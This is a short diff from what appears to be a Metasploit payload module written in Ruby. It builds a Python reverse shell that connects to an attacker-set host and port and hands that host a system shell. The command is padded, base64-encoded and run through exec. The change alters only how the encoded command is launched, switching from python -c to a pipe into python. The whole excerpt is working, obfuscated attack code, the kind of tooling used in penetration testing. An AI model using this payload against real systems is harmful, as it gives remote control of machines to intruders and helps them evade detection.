@@ -55,7 +55,7 @@ module MetasploitModule
     raw_cmd = "import socket,subprocess,os;host=\"#{datastore['LHOST']}\";port=#{datastore['LPORT']};s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(\"#{datastore['SHELL']}\")"
     obfuscated_cmd = raw_cmd.gsub(/,/, "#{random_padding},#{random_padding}").gsub(/;/, "#{random_padding};#{random_padding}")
     encoded_cmd = Rex::Text.encode_base64(obfuscated_cmd)
-    "python -c \"exec('#{encoded_cmd}'.decode('base64'))\""
+    "echo \"exec('#{encoded_cmd}'.decode('base64'))\" | python"
   end
 
 end
